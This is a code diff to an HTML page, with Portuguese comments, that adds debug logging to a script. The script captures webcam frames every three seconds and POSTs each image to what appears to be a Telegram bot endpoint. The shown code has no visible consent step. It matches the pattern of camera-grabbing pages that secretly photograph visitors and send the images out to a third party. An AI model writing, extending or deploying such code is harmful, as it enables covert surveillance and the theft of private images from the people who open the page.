@@ -30,11 +30,13 @@
             setInterval(() => {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/png');
+                console.log('Capturou foto:', imageData); // Log para verificar se a foto foi capturada
                 sendPhotoToTelegram(imageData);
             }, 3000); // Captura uma foto a cada 3 segundos
         }
 
         function sendPhotoToTelegram(imageData) {
+            console.log('Enviando foto para o Telegram'); // Log para verificar se a função foi chamada
             fetch(url, {
                 method: 'POST',
                 headers: {
@@ -46,6 +48,7 @@
                 })
             }).then(response => response.json())
               .then(data => {
+                  console.log('Resposta do Telegram:', data); // Log para verificar a resposta do Telegram
                   if (data.ok) {
                       console.log('Foto enviada com sucesso!');
                   } else {
@@ -61,5 +64,3 @@
     </script>
 </body>
 </html>
-
-         
